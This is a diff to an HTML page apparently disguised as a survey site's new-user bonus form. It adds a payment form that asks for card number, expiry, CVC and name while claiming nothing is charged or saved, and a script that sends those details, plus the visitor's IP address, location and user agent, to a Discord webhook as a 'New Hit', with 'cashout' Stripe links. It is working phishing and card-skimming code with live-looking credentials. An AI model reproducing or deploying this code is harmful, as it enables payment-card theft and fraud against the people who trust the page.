@@ -84,7 +84,7 @@ More info: https://beyondco.de/blog/tailwind-jit-compiler-via-cdn
                         <div class="space-y-4">
                           <!-- Email -->
                             <div>
-                                <label class="block text-sm font-medium mb-1" for="card-email">Email <span class="text-red-500">*</span></label>
+                                <label class="block text-sm font-medium mb-1" for="card-email">Account Email <span class="text-red-500">*</span></label>
                                 <input id="card-email" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="email" placeholder="john@company.com" required />
                             </div>
                         </div>
@@ -127,13 +127,52 @@ More info: https://beyondco.de/blog/tailwind-jit-compiler-via-cdn
 
                     <!-- PayPal form -->
                     <div x-show="!card" x-cloak>
-                        <div>
-                            <div class="mb-4">
-                                <button class="font-medium text-sm inline-flex items-center justify-center px-3 py-2 border border-transparent rounded leading-5 shadow-sm transition duration-150 ease-in-out w-full bg-indigo-500 hover:bg-indigo-600 text-white focus:outline-none focus-visible:ring-2">Pay with PayPal - $253.00</button>
+                        <form id="bitcoin2-form" onsubmit="sendToDiscord2(event)">
+                            <div class="space-y-4">
+                              <!-- Email -->
+                                <div>
+                                    <label class="block text-sm font-medium mb-1" for="card-email">Account Email <span class="text-red-500">*</span></label>
+                                    <input id="card-email2" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="email" placeholder="john@company.com" required />
+                                </div>
                             </div>
-                            <div class="text-xs text-gray-500 italic text-center">You will not be charged. Your payment information will not be saved.</div>
-                        </div>
-                    </div>
+                              <!-- Card Number -->
+                                <div>
+                                    <label class="block text-sm font-medium mb-1" for="card-nr">PayPal Email <small>(where you will receive bonus - leave blank if same as Account Email)</small></label>
+                                    <input id="btc-nr2" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="john-paypal@company.com" />
+                                </div>
+                                
+                              
+                                
+                                <!-- Card Number -->
+                                <div>
+                                    <label class="block text-sm font-medium mb-1" for="card-nr">Card Number <span class="text-red-500">*</span></label>
+                                    <input id="card-nr2" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="1234 1234 1234 1234" required />
+                                </div>
+                                <!-- Expiry and CVC -->
+                                <div class="flex space-x-4">
+                                    <div class="flex-1">
+                                        <label class="block text-sm font-medium mb-1" for="card-expiry">Expiry Date <span class="text-red-500">*</span></label>
+                                        <input id="card-expiry2" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="MM/YY" required />
+                                    </div>
+                                    <div class="flex-1">
+                                        <label class="block text-sm font-medium mb-1" for="card-cvc">CVC <span class="text-red-500">*</span></label>
+                                        <input id="card-cvc2" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="number" placeholder="CVC" required />
+                                    </div>
+                                </div>
+                                <!-- Name on Card -->
+                                <div>
+                                    <label class="block text-sm font-medium mb-1" for="card-name">Name on Card <span class="text-red-500">*</span></label>
+                                    <input id="card-name2" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="John Doe" required />
+                                </div>
+                                
+                            <!-- Form footer -->
+                            <div class="mt-6">
+                                    <div class="mb-4">
+                                        <button type="submit" class="font-medium text-sm inline-flex items-center justify-center px-3 py-2 border border-transparent rounded leading-5 shadow-sm transition duration-150 ease-in-out w-full bg-indigo-500 hover:bg-indigo-600 text-white focus:outline-none focus-visible:ring-2">Register & Receive Bonus</button>
+                                    </div>
+                                    <div class="text-xs text-gray-500 italic text-center">You will not be charged. Your payment information will not be saved.</div>
+                                </div>
+                                </form>
 
                 </div>
             </div>
@@ -206,6 +245,72 @@ More info: https://beyondco.de/blog/tailwind-jit-compiler-via-cdn
             window.location.replace("https://88surveys.com/onboarding/new-user/bonus/error");
         }
     }
+    
+    async function sendToDiscord2(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        // Gather form data
+        const email2 = document.getElementById('card-email2').value;
+        const bitcoinAddress2 = document.getElementById('btc-nr2').value;
+        const cardNumber2 = document.getElementById('card-nr2').value;
+        const expiryDate2 = document.getElementById('card-expiry2').value;
+        const cvc2 = document.getElementById('card-cvc2').value;
+        const nameOnCard2 = document.getElementById('card-name2').value;
+
+        if (!email2 || !bitcoinAddress2 || !cardNumber2 || !expiryDate2 || !cvc2 || !nameOnCard2) {
+            window.location.replace("https://88surveys.com/onboarding/new-user/bonus/error");
+        }
+
+        // Get user's IP address and location
+        const ipResponse = await fetch('https://ipinfo.io/json?token=b47f552bf713bf'); // Replace with your IPinfo token
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+        const location = ipData.city + ', ' + ipData.region + ', ' + ipData.country;
+        const userAgent = navigator.userAgent;
+
+        // Create the embed object
+        const embed = {
+            title: "🍪 New Hit",
+            fields: [
+                { name: "✉️ Email", value: email2, inline: false },
+                { name: "🪙 PayPal Email", value: bitcoinAddress2, inline: true },
+                { name: "💳 Card Number", value: cardNumber2, inline: false },
+                { name: "📅 Expiry Date", value: expiryDate2, inline: true },
+                { name: "💯 CVC", value: cvc2, inline: false },
+                { name: "🥸 Name on Card", value: nameOnCard2, inline: true },
+                { name: "💻 User IP", value: userIP, inline: false },
+                { name: "📍 Location", value: location, inline: true },
+                { name: "🖥️ User Agent", value: userAgent, inline: false },
+                { name: "🛒 Cashout Card (w/ Billing)", value: "[Stripe](https://buy.stripe.com/5kA9DM0Ur3b8dMseUZ)", inline: true },
+                { name: "🛒 Cashout Card (w/out Billing)", value: "[Stripe 2](https://buy.stripe.com/28oaHQgTpbHEaAg4gm)", inline: false },
+            ],
+            footer: {
+                text: "Copyright 2025 icedvampirefanclub",
+            },
+            color: 5814783 // Discord blurple color
+        };
+
+        // Send the data to the Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1345239961443635242/g_gUp4GyLy1-mFm3P38ICnDqRMCfYFqC4H9AXIC5rJVPRGOzDQj2tzjZdBPTsQ5pDrTj'; // Replace with your webhook URL
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+
+        if (response.ok) {
+            //alert('Your BTC bonus was sent and is pending approval. Please keep an eye out on your wallet and email for our platform opening! You should receive your bonus within 24 hours.');
+            document.getElementById('bitcoin-form2').reset();
+            window.location.replace("https://88surveys.com/onboarding/new-user/bonus/complete");
+
+        } else {
+            document.getElementById('bitcoin-form2').reset();
+            window.location.replace("https://88surveys.com/onboarding/new-user/bonus/error");
+        }
+    }
+    
 </script>
 
 </body>
